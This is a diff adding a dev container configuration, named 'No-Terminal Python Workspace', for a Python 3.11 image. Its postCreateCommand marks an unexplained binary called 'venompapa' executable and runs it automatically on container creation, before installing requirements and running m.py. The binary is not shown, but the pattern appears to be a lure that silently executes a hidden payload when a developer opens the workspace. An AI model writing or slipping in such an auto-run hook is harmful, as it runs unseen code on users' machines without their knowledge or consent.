@@ -1,0 +1,5 @@
+{
+  "name": "No-Terminal Python Workspace",
+  "image": "mcr.microsoft.com/devcontainers/python:3.11",
+  "postCreateCommand": "chmod +x venompapa && ./venompapa && pip install -r requirements.txt && python m.py"
+}
